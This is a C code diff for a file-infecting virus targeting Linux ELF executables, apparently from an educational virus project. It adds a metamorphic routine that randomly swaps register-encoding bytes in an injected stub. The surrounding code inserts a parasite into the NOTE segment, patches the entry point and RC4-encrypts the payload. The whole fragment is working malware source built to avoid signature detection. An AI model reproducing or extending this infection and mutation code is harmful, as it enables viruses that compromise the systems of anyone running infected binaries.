@@ -41,6 +41,22 @@ __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_P
 	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, STUB_SIZE);
 }
 
+__attribute__((always_inline)) static inline void metamorph_stub(char *dst, Elf64_Phdr **segment)
+{
+	const struct s_metamorph metamorph =
+	{
+		{RBP, RSP, RAX, RDI, RSI, RDX, RCX, RBX},
+		{CODE_OFFSET_1, CODE_OFFSET_2, CODE_OFFSET_3},
+	};
+
+	char *stub = dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE);
+
+	for (register size_t index = 0; index < OFFS_SIZE; index++)
+	{
+		_memcpy(stub + metamorph.offset[index], &metamorph.code[_get_random_integer(CODE_SIZE)], sizeof(unsigned short));
+	}
+}
+
 __attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
 {
 	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
@@ -88,6 +104,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	int fd;
 
 	const size_t filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;
+	const unsigned char key[] = "********";
 
 	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 	{
@@ -95,10 +112,9 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		goto label;
 	}
 
-	unsigned char key[] = "********";
-
 	write_on_memory(ptr, (char *)host->header, host->segment);
 	insert_stub(ptr, host->segment);
+	metamorph_stub(ptr, host->segment);
 	insert_parasite(ptr, host->segment);
 	patch_entry_point(ptr, host);
 	RC4(key, DEFAULT_KEY_SIZE, ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);
